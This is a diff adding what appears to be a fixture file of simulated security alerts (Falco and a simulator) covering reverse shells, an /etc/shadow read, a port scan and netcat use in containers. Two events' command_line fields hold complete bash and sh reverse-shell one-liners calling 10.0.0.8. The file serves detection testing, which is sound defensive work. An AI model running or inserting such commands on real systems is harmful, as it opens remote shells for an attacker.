@@ -1,0 +1,66 @@
+[
+  {
+    "source": "falco",
+    "event_type": "reverse_shell_detected",
+    "severity": "critical",
+    "hostname": "node-11",
+    "container_name": "api-gateway",
+    "raw_event_json": {
+      "rule": "Reverse shell detected",
+      "priority": "Critical",
+      "process": "bash",
+      "user": "root",
+      "command_line": "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1"
+    }
+  },
+  {
+    "source": "falco",
+    "event_type": "reverse_shell_detected",
+    "severity": "critical",
+    "hostname": "node-11",
+    "container_name": "api-gateway",
+    "raw_event_json": {
+      "rule": "Reverse shell detected",
+      "priority": "Critical",
+      "process": "sh",
+      "user": "root",
+      "command_line": "sh -i >& /dev/tcp/10.0.0.8/5555 0>&1"
+    }
+  },
+  {
+    "source": "falco",
+    "event_type": "credential_access",
+    "severity": "high",
+    "hostname": "node-7",
+    "container_name": "payments-service",
+    "raw_event_json": {
+      "rule": "Sensitive file opened",
+      "priority": "Error",
+      "file": "/etc/shadow"
+    }
+  },
+  {
+    "source": "simulator",
+    "event_type": "port_scan_detected",
+    "severity": "medium",
+    "hostname": "node-2",
+    "container_name": "scanner-box",
+    "raw_event_json": {
+      "src_ip": "10.10.0.5",
+      "dst_ip": "10.10.0.10",
+      "ports": [21, 22, 80, 443]
+    }
+  },
+  {
+    "source": "falco",
+    "event_type": "suspicious_process",
+    "severity": "high",
+    "hostname": "node-1",
+    "container_name": "lab-nginx",
+    "raw_event_json": {
+      "rule": "Terminal shell in container",
+      "priority": "Warning",
+      "process": "nc"
+    }
+  }
+]
